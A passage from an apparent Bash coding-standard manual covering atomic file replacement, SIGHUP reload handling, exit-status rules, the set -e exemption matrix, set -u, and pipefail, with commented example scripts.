[[ "$(stat -c '%d' -- "$tmp")" == "$(stat -c '%d' -- "$(dirname -- "$target")")" ]] \
  || die 5 'tmp and target are on different filesystems'
```

### Cleanup on failure and permissions

Combine with an EXIT trap so a failure between `mktemp` and `mv`
removes the tempfile; cancel the trap on success:

```bash
tmp=$(mktemp -- "${target}.XXXXXX") || die 5 "mktemp failed"
trap 'rm -f -- "$tmp"' EXIT
write_data > "$tmp"
mv -- "$tmp" "$target"
trap - EXIT
```

`mktemp` creates files mode 0600, so the new `$target` will have
mode 0600 and the tempfile's owner. To preserve the previous file's
permissions, copy them before the rename:

```bash
[[ -e $target ]] && chmod --reference="$target" -- "$tmp"
mv -- "$tmp" "$target"
```

**See also**: §12.5 (`trap` builtin), §12.12 (idempotent cleanup),
§12.13 (tempfile lifecycle), §12.14 (lockfile pattern), BCS0110
(cleanup and traps), BCS1006 (temporary file handling), BCS0901 (safe
file testing).

## 12.16 Reload-on-SIGHUP

Long-lived daemons conventionally treat SIGHUP as a "reload your
configuration" request. The kernel does not enforce this — SIGHUP's
default action is termination — but `nginx`, `apache`, `sshd`, and
most well-behaved daemons honour it. A bash daemon should follow suit.

```bash
# scenario: minimal SIGHUP-reload (naive — see race below)
reload_config() {
  source -- "$config_file"
  info 'config reloaded'
}
trap reload_config HUP
```

This works for trivial cases but has a race: SIGHUP is asynchronous
and bash dispatches handlers between simple commands. If the signal
arrives partway through a critical section that depends on the *old*
config, the handler reloads under the section's feet and produces a
torn read. The fix is the **flag-and-defer** pattern.

### Flag-and-defer for race-free reload

The handler does the smallest possible work — set a flag — and the
main loop checks the flag at safe points and performs the actual
reload there. Between safe points, the running command sees a
consistent config; reloads happen between iterations, never inside one.

```bash
# scenario: race-free SIGHUP reload via flag-and-defer
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -i RELOAD_REQUESTED=0
declare -- config_file=/etc/myd/myd.conf

handle_hup() { RELOAD_REQUESTED=1; }       # async-safe: one assignment
trap handle_hup HUP

reload_config() {
  source -- "$config_file"                 # may take time, may fail
  info 'config reloaded'
  RELOAD_REQUESTED=0
}

# Initial load.
source -- "$config_file"

# Main loop — check the flag at safe boundaries, never mid-work.
while :; do
  if (( RELOAD_REQUESTED )); then
    reload_config || warn 'reload failed; keeping previous config'
  fi

  # … one unit of work using the loaded config …
  do_one_iteration

  sleep "${POLL_INTERVAL:-5}" &            # interruptible sleep
  wait $! || true                          # SIGHUP wakes wait, returns
done
```

Key points:

1. The handler does **one** thing — assign to an integer. This is the
   bash analogue of "async-signal-safe" (§12.11). Anything more (file
   I/O, sourcing, logging) risks running concurrently with itself if a
   second SIGHUP arrives.
2. The main loop polls the flag at the top of each iteration. The
   reload happens *between* units of work, not inside one.
3. `sleep N &; wait $!` rather than bare `sleep N`: the `wait` form is
   interruptible by a signal, so SIGHUP wakes the daemon immediately
   instead of forcing it to live out the full sleep before noticing.
4. A failed reload is logged but does not abort the daemon; the
   previous (still-loaded) config remains in effect. This is the
   standard contract for SIGHUP — *try* to reload, don't die trying.

For systemd-managed daemons, wire `ExecReload=/bin/kill -HUP
$MAINPID` in the unit file; the bash logic above is unchanged. Reload
should rebuild *configuration* state only (log paths, DB params); it
should **not** rebind sockets or lockfiles. If a change requires that,
log "restart required" and exit cleanly so a supervisor relaunches.

**See also**: §12.5 (`trap` builtin), §12.6 (pseudo-signals), §12.11
(signal-safe code), §12.12 (idempotent cleanup), §14.7 (logging
discipline), BCS0110 (cleanup and traps), BCS0603 (trap handling),
BCS0111 (configuration file loading).

# Part XIII — Error Handling and Exit Status

*Bash's error-handling semantics are notoriously subtle. `set -e` does not mean "exit on any error" — it means "exit on any error in one of N specific contexts, with M specific exemptions". This Part documents the full semantics and the strict-mode discipline that makes them predictable.*

---

---

## 13.1 Exit status fundamentals

Every command produces an 8-bit exit status. Bash exposes it as `$?`
and uses it for control-flow decisions (`if`, `while`, `&&`, `||`,
`set -e`). The status is a single unsigned byte — a hard, kernel-level
constraint — so any code outside the range 0–255 is silently truncated.

| Range | Meaning |
|-------|---------|
| `0` | success |
| `1`–`125` | application-defined failure |
| `126` | found but not executable |
| `127` | command not found |
| `128 + N` | killed by signal `N` (e.g. 130 = SIGINT, 143 = SIGTERM) |
| `255` | fatal error from `exit -1` (truncated) |

Bash's own conventions:

- `$?` reflects the last *foreground* command. Backgrounded jobs do
  not update `$?`; their status is collected via `wait $!`.
- A pipeline's status is the **rightmost** component's status by
  default; with `set -o pipefail` it is the rightmost *non-zero*
  status (§13.5).
- A function's status is the status of its last command, or the
  argument to `return N`.
- A sourced file's status is the status of its last command, or the
  argument to `return N` (not `exit N` — `exit` ends the *whole*
  shell, not just the source).

### 8-bit truncation: `exit 257` becomes `exit 1`

The status byte is taken `mod 256`. Negative values wrap into the
high half of the byte; values above 255 wrap into the low half.

```bash
# scenario: exit status truncation
# A subshell `(exit N)` sets $? to N's truncated value without running
# the inner output; same semantics as `$(exit N)` but no SC2091 noise.
# Out-of-range exit codes are the whole point of the demo — suppress
# SC2242 across the group via a brace-block scope.
# shellcheck disable=SC2242
{
  (exit 257); echo "$?"     # ⇒ 1     (257 % 256 = 1)
  (exit 256); echo "$?"     # ⇒ 0     (256 % 256 = 0 — silent failure!)
  (exit 511); echo "$?"     # ⇒ 255   (511 % 256 = 255)
  (exit -1);  echo "$?"     # ⇒ 255   (-1 wraps to 255)
  (exit -2);  echo "$?"     # ⇒ 254
}
```

The `exit 256` case is the dangerous one: a script meant to flag
failure with code 256 reports success. Always keep exit codes inside
the 1–125 application range; reserve 126/127 for the shell, 128+ for
signals, and never go above 255.

### Pipelines and `pipefail`

```bash
# scenario: pipefail changes the status of a pipeline
false | true | true; echo "$?"          # ⇒ 0  (rightmost succeeded)

set -o pipefail
false | true | true; echo "$?"          # ⇒ 1  (leftmost non-zero wins)
```

The default behaviour exists for historical sh-compatibility; under
strict mode (BCS0101) `pipefail` is mandatory and the rightmost-only
rule never applies to BCS-compliant scripts. See §13.5 for the full
discussion.

### Signal-killed children: 128 + N

Conventionally, when a process is terminated by signal `N`, its waited
status is `128 + N`. SIGINT (2) → 130, SIGTERM (15) → 143, SIGKILL (9)
→ 137. This is a shell convention (the kernel exposes the signal
number directly through `wait(2)`'s status word, and the shell encodes
it as `128 + N` for compatibility with the 8-bit exit-status return
type). See Appendix L for the complete table.

**See also**: §13.2 (`set -e` semantics), §13.5 (pipefail), §13.10
(exit code conventions), §13.11 (propagating exit codes), Appendix K
(signal numbers), Appendix L (exit code conventions), BCS-bash
`23_EXIT-STATUS.md`, BCS0602 (exit codes).

## 13.2 `set -e` (errexit) — full semantics

`set -e` (equivalently `set -o errexit`) is the most-misunderstood feature
in bash. It does not "exit on any error". It exits when an unchecked
*simple command*, *pipeline*, or *list* returns a non-zero status from a
context that is not exempt. The exemption matrix in §13.3 is canonical;
this chapter establishes the underlying mechanics so the matrix reads as
consequence rather than convention.

### What `errexit` actually triggers on

Bash evaluates a command and, if that command's final exit status is
non-zero, asks two questions: (1) is the command in an exempt context?
(2) is errexit *currently* in force? Only if the answer to both is "no
exempt, yes in force" does bash run the ERR trap (§13.8) and exit with
the failed command's status. Errexit is not a hook fired from the kernel
or a wrapper around `wait()`; it is a check inside bash's own command
dispatcher, which is why its rules are syntactic and rooted in how a
command was invoked rather than what it does.

The shell-level definition is: errexit exits the shell when a command's
exit status, after the shell has computed it, is non-zero — *unless* the
command is part of one of the exempt structures enumerated in §13.3.

```bash
# scenario: minimal demo — the simple-command rule
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
echo "before"
false                                # ⇒ shell exits here, $? = 1
echo "after"                         # ⇒ never printed
```

### Pipelines

A pipeline's exit status is the status of its **last** component (the
"rightmost" rule). Without `pipefail` (§13.5), a pipeline like
`false | true` returns 0, so errexit will not fire. With `pipefail`, the
pipeline returns the rightmost *non-zero* status, so the same pipeline
returns 1 and errexit fires. The check is on the pipeline's final status,
not on any intermediate component.

```bash
# scenario: pipeline status without and with pipefail
set -e                      # no pipefail
false | true; echo "$?"     # ⇒ 0  — script continues, no exit
set -o pipefail
false | true                # ⇒ exits, status 1
```

### Compound commands and lists

For `if`, `while`, `until`, `&&`, `||`, the *condition* command's failure
is examined deliberately by the construct itself. Errexit therefore must
not act on it — otherwise `if grep -q foo file; then …` would exit on
absence of `foo`. Inside the *body* of `if/while/until`, errexit is fully
active again (this is the rule readers most often forget). For `&&` and
`||`, only the **left** operand of the leftmost operator is exempt; once
the chain has resolved to a single status, errexit applies.

The bash 5.2 manual phrases this as "the shell does not exit if the
command that fails is part of the command list immediately following a
`while` or `until` keyword, part of the test in an `if` statement, part
of any command executed in a `&&` or `||` list except the command
following the final `&&` or `||`, any command in a pipeline but the last,
or if the command's return status is being inverted with `!`."

### Functions, subshells, and command substitution

When a function is invoked, its body executes with errexit's *effective*
state determined by the call site: a function called from an exempt
context (e.g. as the condition of `if`) inherits that exemption — its
internal `set -e` does not save it, because the failure status will be
absorbed by the surrounding construct. This is the single most common
"why didn't `set -e` exit my function?" complaint.

Subshells (`( ... )`) and command substitutions (`$(...)`) have their own
errexit state. By default it is *not* inherited from the parent. Bash 4.4
introduced `shopt -s inherit_errexit` (§13.6) which fixes the substitution
case; subshells must be handled by repeating `set -e` inside, or by
ensuring their parent context will detect a non-zero exit.

```bash
# scenario: function called as if-condition — errexit is dormant
fail_if_missing() {
  set -e
  test -f "$1"               # would normally exit on absence
  echo "found: $1"           # but it does NOT — errexit is dormant
}
if ! fail_if_missing /no/such/file; then
  echo "function returned non-zero, but did not exit shell"
fi
# ⇒ found: /no/such/file
# ⇒ (the `if !` branch does NOT fire — echo's exit 0 masks the test failure)
```

### Exit status that propagates

When errexit fires, the shell exits with the *failing command's* status,
not 1. This is load-bearing: callers can switch on the exit code to
distinguish e.g. usage error (2) from I/O failure (5) from missing
dependency (18) (§13.10). Inside an ERR trap (§13.8), `$?` holds the
failing status and `$BASH_COMMAND` holds the literal command text.

### Toggling errexit

`set +e` disables errexit; `set -e` re-enables. The common idiom is to
disable around a block where individual exit codes are inspected
manually, then re-enable:

```bash
# scenario: targeted disable for code-by-code inspection
set +e
output=$(some_command --probe)
rc=$?
set -e
case $rc in
  0)  : ok ;;
  3)  warn "probe missing — continuing" ;;
  *)  die 5 "probe failed: rc=$rc" ;;
esac
```

The `||` idiom (§13.7) is normally cleaner: `output=$(some_command || true)`.

### Interaction with `return` and `exit`

`return N` from a function yields exit status `N` for the function call.
If the call is in an unexempted context and `N` is non-zero, errexit will
fire. `exit N` ends the *current* shell (or subshell) immediately,
regardless of errexit. Inside a subshell, `exit` ends the subshell; the
parent's errexit then applies to the subshell's exit status as a normal
simple-command failure.

### What errexit does **not** do

- It does not catch errors *inside* command substitutions unless
  `inherit_errexit` is set (§13.6). `result=$(grep foo file)` happily
  swallows `grep`'s exit status by default.
- It does not catch errors that the syntax marks as deliberately
  inspected (the exemption matrix in §13.3).
- It does not run the ERR trap on `exit N` calls — those bypass errexit
  entirely. The EXIT trap (§12.6) does fire on `exit`.
- It does not survive arithmetic that evaluates to zero. `(( count++ ))`
  when `count==0` returns status 1 and triggers errexit — this is a
  documented gotcha. Use `count+=1` or `(( ++count ))` (BCS0505).
- It does not unwind nested function calls cleanly: each function frame
  collapses with the failing status, and the shell exits at the
  outermost frame. Cleanup must be done via the EXIT trap (§12.6) or
  per-frame ERR handlers.

### Diagnosing "errexit didn't fire"

Run through this short checklist when a non-zero command failed to halt
the script:

1. Confirm `set -e` is actually in force at that line. `set -o |
   grep errexit` (or `[[ $- == *e* ]]`) reports the current state.
   `set +e` or a sourced helper that toggles errexit may have left it
   off.
2. Inspect the surrounding syntax. Is the failing command in any of
   the rows of the §13.3 matrix? Most "didn't fire" reports collapse
   to row 1 (left of `&&`/`||`), row 5 (non-final pipeline component
   without `pipefail`), or row 7 (inside `$(...)` without
   `inherit_errexit`).
3. Check function-call context. If the command is inside a function
   and the function was called from an exempt position, errexit is
   suspended for the duration.
4. Check for `local x=$(failing)` — this single-line pattern destroys
   the substitution's exit status (§13.11). The fix is to declare and
   assign on separate lines.

If none of the above explains it, the failing command may have a
non-obvious exemption — `(( expr ))` evaluating to zero is the prime
suspect (§13.3 row 10).

### Practical guidance

`set -e` alone is brittle. The BCS strict-mode contract pairs it with
`set -u` (§13.4), `set -o pipefail` (§13.5), `inherit_errexit` (§13.6),
and an ERR trap or EXIT trap for diagnostics (§13.8, §12.6). Together
they form a defensible error-detection regime; alone, errexit invites
the cargo-cult complaint that "`set -e` is broken". It is not broken —
it is precise, and the exemption matrix (§13.3) is its specification.

For functions intended to fail loudly even when called as conditions,
prefer explicit checks: `result=$(cmd) || die 5 "cmd failed"`. For
library code, see §13.11 for the canonical exit-code propagation
patterns.

**See also**: §13.3 (exemption matrix), §13.5 (pipefail), §13.6
(inherit_errexit), §13.8 (ERR trap), §13.11 (propagating exit codes),
§12.6 (EXIT and ERR pseudo-signals), BCS0101 (strict mode), BCS0601
(exit on error), BCS0505 (arithmetic gotchas), BCS-bash `30_43_set.md`.

## 13.3 The errexit exemption matrix

The contexts in which `set -e` does *not* exit on a non-zero status.
Memorise this list — it is the single largest source of "set -e didn't
trigger" complaints. This chapter is the canonical reference; §13.2
establishes the underlying mechanics, and every other §13 leaf forwards
to a row here.

### The matrix

| # | Context | Errexit fires? | Why |
|---|---------|----------------|-----|
| 1 | Left of `&&` or `||` | No | The operator deliberately inspects the status |
| 2 | Condition of `if`, `elif` | No | The construct deliberately inspects the status |
| 3 | Condition of `while`, `until` | No | Same as above; loops on the test |
| 4 | `!`-prefixed command (negation) | No | Inversion implies inspection |
| 5 | Pipeline component, not the last (no `pipefail`) | No | Pipeline status is the last component |
| 6 | Pipeline component, not the last (with `pipefail`) | Pipeline-level | Errexit fires once on the pipeline's overall status |
| 7 | Command substitution `$(...)` (no `inherit_errexit`) | No | Subshell errexit is fresh-disabled |
| 8 | Command substitution `$(...)` (with `inherit_errexit`) | Yes | Subshell inherits parent's errexit |
| 9 | Function called from any exempt context (1-5, 7) | No | Exemption propagates to the call's status |
| 10 | `(( expr ))` evaluating to 0 — counts as failure | Yes (gotcha) | Arithmetic 0 is shell "false" |
| 11 | `let expr` evaluating to 0 — same | Yes (gotcha) | Same as 10 |
| 12 | `[[ ... ]]` test returning false | Yes | Exits unless wrapped per rows 1-4 |
| 13 | Command in an explicit subshell `( ... )` | Subshell-local | Subshell exits; parent then sees its status per rows 1-9 |

Rows 1-9 are the *true* exemptions: errexit cannot fire there at all
(or, for row 6, fires only once at pipeline level rather than per
component). Rows 10-12 are the *anti*-exemptions — places novice
authors expect leniency but get strictness. Row 13 is structural: a
subshell has its own errexit decision, after which the parent applies
errexit to the subshell's overall exit status.

### Worked demonstrations

Each of these scripts assumes the BCS strict-mode preamble. The
question in every case is: does errexit fire?

```bash
# scenario: row 1 — left side of && / ||
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
false && echo unreached       # ⇒ does NOT exit; left of && is exempt
false || echo "fallback"      # ⇒ does NOT exit; left of || is exempt
true && false                 # ⇒ EXITS; right of && is NOT exempt
echo "unreached"              # ⇒ never printed
```

The asymmetry on `&&`/`||` is the most-cited footgun: the *left* operand
is exempt, the *right* (final) operand is not. Chaining `cmd1 && cmd2`
does not protect `cmd2`; protect it with `cmd2 || true` or by including
the whole chain in an exempt position.

```bash
# scenario: row 2-3 — condition of if/while/until
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
if grep -q nonexistent-token /etc/hostname; then  # grep failure is NOT a script error
  echo found
else
  echo "no match — script continues despite grep rc=1"
fi
# `! cmd` in a `while` head is exempt; the negated test is exempt from errexit.
if ! mountpoint -q /mnt 2>/dev/null; then         # one-shot demo of the exemption
  echo "/mnt is not a mountpoint and we kept going"
fi
echo "ran past both"
# ⇒ no match — script continues despite grep rc=1
# ⇒ /mnt is not a mountpoint and we kept going
# ⇒ ran past both
```

The body of `if`/`while`/`until` is *not* exempt — only the test
expression. A failing command inside the body triggers errexit
normally.

```bash
# scenario: row 5-6 — pipeline non-final positions
#!/usr/bin/env bash
set -e                                 # no pipefail
false | true; echo "rc=$?"             # ⇒ rc=0 — pipeline succeeded overall
set -o pipefail
false | true                           # ⇒ EXITS at this line, status 1
```

Without `pipefail`, errexit looks only at the rightmost component. With
`pipefail`, errexit looks at the pipeline as a whole; any non-zero
component status surfaces and the script exits. See §13.5 for the full
treatment.

```bash
# scenario: row 7-8 — command substitution
#!/usr/bin/env bash
set -e                                 # NO inherit_errexit
result=$(grep nope /etc/hostname; echo "after")  # grep fails; echo runs
echo "result=$result"                  # ⇒ result=after — script keeps going
shopt -s inherit_errexit
result=$(grep nope /etc/hostname; echo "after")  # ⇒ EXITS inside $()
```

`inherit_errexit` is the fix for the canonical "my script swallowed an
error" bug: without it, command substitutions silently absorb every
internal failure (§13.6).

```bash
# scenario: row 9 — function called from an exempt context
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
f() { false; echo "f reached after-false"; }
if f; then echo "f succeeded"; else echo "f returned non-zero"; fi
# ⇒ "f reached after-false"  ⇒ "f returned non-zero"
# Inside f, set -e is dormant because the call site is the if-condition.
f                                       # ⇒ EXITS — same f, non-exempt context
```

This is the source of the "my function suddenly stopped exiting" bug
when a previously-direct call is moved under an `if`. The function
*body's* errexit is suppressed by the call-site exemption.

```bash
# scenario: rows 10-11 — arithmetic-zero gotcha
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
declare -i count=0
(( count++ ))                          # ⇒ EXITS — post-inc returns old value 0
echo "unreached"
# Fixes:
(( ++count ))                          # ⇒ pre-inc returns new value 1; safe
count+=1                               # ⇒ assignment, not arithmetic test; safe
(( count++ )) || true                  # ⇒ explicit pardon
```

`(( expr ))` and `let expr` use the result of `expr` as the command's
exit status with the convention "0 → false → exit 1, non-zero → true →
exit 0". This is *opposite* to most shell semantics. BCS0505 mandates
`+= 1` over `((var++))` precisely to avoid this trap.

```bash
# scenario: row 13 — explicit subshell
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
( false; echo "subshell after-false" )   # ⇒ subshell EXITS on false
echo "parent rc=$?"                       # ⇒ parent rc=1; parent then exits
```

A subshell is a fresh shell process; its errexit applies inside. Once
the subshell ends, its overall exit status is treated as a single
command's status by the parent shell, where rows 1-9 apply.

### Reading the matrix as a checklist

When debugging "why didn't `set -e` exit?", walk the matrix top-to-bottom:

1. Is the failing command the left of `&&`/`||`? — exempt.
2. Is it inside an `if`/`while`/`until` test? — exempt.
3. Is it `!`-prefixed? — exempt.
4. Is it a non-final pipeline component without `pipefail`? — exempt.
5. Is it inside `$(...)` without `inherit_errexit`? — exempt.
6. Is the surrounding *function call* in an exempt context? — exempt.
7. Otherwise it should have fired; check the trap (§13.8) and ensure
   `set -e` is actually in force at that line (`set -o | grep errexit`).

### Composition with strict-mode allies

The matrix is normative when the script runs the BCS strict-mode
contract. With only `set -e` and none of `pipefail`/`inherit_errexit`,
rows 6 and 8 collapse to the more-permissive variants and the script's
error-detection coverage is materially reduced. §13.9 inlines the full
contract.

**See also**: §13.2 (errexit semantics), §13.5 (pipefail), §13.6
(inherit_errexit), §13.7 (`||:` idioms), §13.9 (strict-mode contract),
§13.11 (propagating exit codes), §12.6 (ERR pseudo-signal), BCS0101,
BCS0505 (arithmetic), BCS-bash `30_43_set.md`.

## 13.4 `set -u` (nounset)

`set -u` (equivalently `set -o nounset`) treats any reference to an unset
variable as an error: bash prints `unbound variable` to stderr, returns
non-zero status, and (under `set -e`) exits. It is the second leg of the
strict-mode tripod (with `errexit` and `pipefail`) and the cheapest
single defence against typo-introduced bugs.

### What counts as "unset"

Unset means the variable was never assigned, was explicitly `unset`, or
is a positional parameter (`$1`, `$2`, …) that does not exist. *Empty*
is not unset: `var=""` declares the name and leaves it empty;
`echo "$var"` is fine under `set -u`. A `declare`d variable with no
value is also "set to empty" and not flagged.

```bash
# scenario: unset vs empty under set -u
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- empty=""
echo "empty: [$empty]"         # ⇒ empty: []   — empty is set; no error

unset empty
echo "unset: [$empty]"         # ⇒ unbound variable; EXITS

# Positional parameters:
echo "first: [$1]"             # ⇒ unbound if no $1 was passed
```

`declare -- name` (or `local -- name`) without an `=` *does* set the
variable to empty in current bash; relying on this is portable to bash
4.0+. Do not assume `declare -- name` leaves the variable in an unset
state — it does not.

### Default-expansion forms

The parameter-expansion family is the canonical way to read a possibly-
unset variable without disabling `set -u`:

| Form | Behaviour when unset | Behaviour when empty |
|------|----------------------|----------------------|
| `${var}` | error under `set -u` | empty string |
| `${var-default}` | yields `default` | empty string |
| `${var:-default}` | yields `default` | yields `default` |
| `${var=default}` | sets *and* yields `default` | empty string |
| `${var:=default}` | sets *and* yields `default` | sets *and* yields `default` |
| `${var?msg}` | error with `msg`, exits | empty string |
| `${var:?msg}` | error with `msg`, exits | error with `msg`, exits |
| `[[ -v var ]]` | tests "is it set?" | tests "is it set?" (returns true) |

The `:-` form is the one used in BCS templates for "may be unset, treat
as empty" — `"${OPTION:-}"` is the standard way to test or pass an
optional flag without tripping `set -u`. The `:?` form is the
canonical "required argument" assertion: `: "${1:?usage: foo PATH}"`.

`[[ -v var ]]` is bash 4.2+ and is the cleanest *test* form: it asks
"is this name bound?" without consuming the value. Use it where the
question is set-vs-unset rather than empty-vs-non-empty.

### Array gotchas

The most-tripped-over `set -u` rule concerns arrays. A *declared but
empty* array indexed by `[@]` or `[*]` errors under `set -u`. This is
the array equivalent of "unbound variable", and bites every script
that iterates over a result array that *might* be empty.

```bash
# scenario: empty-array iteration under set -u
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -a results=()
# The naive loop:
#   for x in "${results[@]}"; do echo "$x"; done
# would abort with:
#   bash: results[@]: unbound variable
# (so we don't run it here — set -u + empty array + [@] = errexit). The
# next two forms run safely:

# Fix 1: default-expand the array
for x in "${results[@]:-}"; do        # → loop runs zero times, no error
  echo "$x"
done
echo "fix-1 ok"                       # ⇒ fix-1 ok

# Fix 2: gate the loop on length
if (( ${#results[@]} )); then
  for x in "${results[@]}"; do echo "$x"; done
fi
echo "fix-2 ok"                       # ⇒ fix-2 ok
```

The `${arr[@]:-}` workaround substitutes a single empty element when
the array is empty; for a true zero-iteration loop, the explicit
length-gate is cleaner. BCS0206 prefers the gate form for clarity.

Similarly, `"${arr[i]}"` errors when index `i` is unset; use
`"${arr[i]:-}"` if the slot may be vacant.

### Positional-parameter exception

`$@` and `$*` do **not** error under `set -u` when the script was
invoked with no arguments; they expand to nothing. This is intentional
— `for arg in "$@"; do ...; done` must work for zero-arg scripts.
However, *individual* positionals (`$1`, `$2`, …) error if not set:

```bash
# scenario: positional handling
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
foo() {
  : "${1:?missing PATH argument}"     # required: error with msg if unset
  local -- input="$1"
  local -- output="${2:-/tmp/out}"    # optional: default
  echo "$input -> $output"
}
foo "$@"                              # safe; "$@" empty-on-no-args
```

This pattern is the BCS-recommended argument validation idiom (BCS0803).

### Interaction with `local`/`declare`

A `local -- name` inside a function brings `name` into scope; if you
read it before assigning a value, the rule depends on bash version. In
modern bash (4.4+), `local -- name` initialises to empty and `set -u`
will not flag a read. Do not rely on this for clarity — assign at
declaration: `local -- name=""`.

`local -n ref=other` (nameref) under `set -u` errors if `other` is
unset *at the time the nameref is dereferenced*, not at declaration.

### When to disable

Almost never. The only legitimate reasons are:
- Sourcing a third-party file that violates `set -u` and cannot be
  patched: wrap in `set +u; source file; set -u`.
- A specific block reading completion-style data where unbound is the
  signalling convention. Document the disable.

`set +u` and `set -u` may be toggled at any point. Prefer to bracket
the violation as narrowly as possible.

### Practical guidance

The BCS strict-mode preamble enables `set -u` unconditionally. Combined
with explicit `declare`/`local --` (BCS0201) at the top of every
function, `set -u` reduces typo bugs to zero — `if [[ $resluts ]];`
errors immediately rather than silently testing an empty string.

**See also**: §13.2 (errexit), §13.9 (strict-mode contract), §13.11
(propagation), BCS0101 (strict mode), BCS0201 (type-specific
declarations), BCS0206 (arrays), BCS0803 (argument validation),
BCS-bash `13_03_Parameter-Expansion.md`.

## 13.5 `set -o pipefail`

`set -o pipefail` changes a pipeline's exit status from "status of the
last component" to "status of the rightmost non-zero component, or zero
if all succeed". Without it, `false | true` returns 0 and errexit never
sees the failure. With it, the same pipeline returns 1 and errexit
fires. This chapter covers the rule, the `PIPESTATUS[]` array used to
inspect every component, and the SIGPIPE corner case that surprises
everyone the first time.

### The rightmost-non-zero rule

A pipeline `A | B | C | D` produces four exit statuses, one per
component, available in the array `PIPESTATUS[]` as `${PIPESTATUS[0]}`
through `${PIPESTATUS[3]}`. The pipeline's overall status is then:

- Without `pipefail`: `${PIPESTATUS[3]}` (the last component).
- With `pipefail`: 0 if all are 0; otherwise `${PIPESTATUS[k]}` where
  `k` is the *highest* index whose status is non-zero — that is, the
  *rightmost* failure.

"Rightmost non-zero" is the rule literally; do not read it as
"first failure". A pipeline `false | false-2 | false-3` returns the
status of `false-3`, even though `false` failed first. If you need
"first failure" semantics, inspect `PIPESTATUS[]` manually after the
pipeline.

```bash
# scenario: three pipelines under pipefail; observe overall status and PIPESTATUS
#!/usr/bin/env bash
set -uo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# All-success
true | true | true
echo "all-ok rc=$? PIPESTATUS=${PIPESTATUS[*]}"   # ⇒ rc=0 PIPESTATUS=0 0 0

# Middle fails
true | false | true
echo "mid-fail rc=$? PIPESTATUS=${PIPESTATUS[*]}" # ⇒ rc=1 PIPESTATUS=0 1 0

# Multiple fail — rightmost wins
false | false | (exit 7)
echo "many-fail rc=$? PIPESTATUS=${PIPESTATUS[*]}" # ⇒ rc=7 PIPESTATUS=1 1 7
```

(Above runs without `set -e` so we can read all three; under `set -e`
the script would exit at the first non-zero pipeline.)

### `PIPESTATUS[]` discipline

`PIPESTATUS[]` is overwritten by the *next* pipeline (and by most
single commands too — it gets reset to a one-element array holding
`$?`). Capture immediately after the pipeline:

```bash
# scenario: capture full pipeline status before it is clobbered
set -uo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

curl -sf "$url" | jq -e '.records[]' | head -50
declare -ai rcs=("${PIPESTATUS[@]}")          # snapshot now or lose it

if (( rcs[0] != 0 )); then
  die 5 "curl failed: rc=${rcs[0]}"
elif (( rcs[1] != 0 )); then
  die 5 "jq failed: rc=${rcs[1]}"
elif (( rcs[2] != 0 )); then
  die 5 "head failed: rc=${rcs[2]}"
fi
```

Even a trivial-looking command on the very next line — `[[ -n $x ]]` —
will replace `PIPESTATUS[]` with `[0]=0`, losing the upstream
information. Snapshot first, decide second.

### SIGPIPE and `head | sort | …` interactions

SIGPIPE (signal 13) is delivered to a pipeline component when its
downstream reader closes. The default disposition is "terminate", and
the resulting exit status is 128+13 = 141. Under `pipefail`, this 141
becomes the pipeline's status — `cat huge.log | head -1` exits 141 if
`cat` is killed by SIGPIPE after `head` quits.

```bash
# scenario: SIGPIPE poisons pipefail unless guarded
set -uo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
yes | head -1 >/dev/null
echo "rc=$? PIPESTATUS=${PIPESTATUS[*]}"
# ⇒ rc=141 PIPESTATUS=141 0   — yes was killed by SIGPIPE
```

This is "correct" behaviour but inconvenient: the pipeline did exactly
what was asked, yet the script exits 141 under `set -e -o pipefail`.
Mitigations:

- Tolerate it: `cat file | head -1 || (( $? == 141 ))` — accept 141
  as success.
- Restructure: `head -1 file` instead of `cat file | head`.
- Suppress per-component: `{ trap '' PIPE; cat file; } | head -1`
  installs `SIG_IGN` on PIPE for the producer; `cat` then sees a write
  error and exits non-zero with errno EPIPE rather than dying on
  signal. Status becomes 1 (or whatever `cat` reports), still surfaced
  by pipefail.
- Capture and check: snapshot `PIPESTATUS[]` and treat 141 specially.

Most idiomatic bash chooses the first or second option. The third is
necessary only when a long-running producer needs to remain alive
after the consumer quits.

### Interaction with `errexit`

`pipefail` *does not* by itself exit on failure; it only re-defines the
pipeline's exit status. Errexit then sees that status as it would any
other and applies the matrix (§13.3). The combination is:

- `set -e` alone: pipelines fail only on last-component failure.
- `set -e -o pipefail`: pipelines fail on any component failure.
- `set +e -o pipefail`: pipelines have correct status, but errexit
  ignores it; the script must inspect `$?` or `PIPESTATUS[]` manually.

`pipefail` applies inside command substitutions, subshells, and
function bodies — it is a shell option, inherited along with the rest
of strict-mode state.

### Pipelines vs lists

`A; B; C` is a *list*, not a pipeline. `pipefail` does not apply.
Errexit visits each command in turn and exits on the first non-zero
that is not in an exempt context.

`A && B && C` is also not a pipeline. Each is a separate command;
errexit sees them per the matrix (§13.3 row 1).

### Practical guidance

Always pair `pipefail` with `errexit` and `inherit_errexit`. The BCS
strict-mode preamble does this. Without `pipefail`, error-detection
through pipes is silently broken, and bugs migrate from the producing
side to whatever happens to read its output last. With it, every
pipeline component is a first-class participant in error handling.

When inspecting `PIPESTATUS[]`, snapshot immediately. When SIGPIPE is
expected, plan for 141 explicitly — do not silently `|| true` it,
because that mask hides every other pipeline failure too.

**See also**: §13.2 (errexit semantics), §13.3 (exemption matrix row
6), §13.6 (inherit_errexit), §13.9 (strict-mode contract), §13.11
(propagation), §12.3 (uncatchable signals — SIGPIPE catchability),
BCS0101 (strict mode), BCS0601 (exit on error), BCS-bash
`30_43_set.md`.

## 13.6 `inherit_errexit`

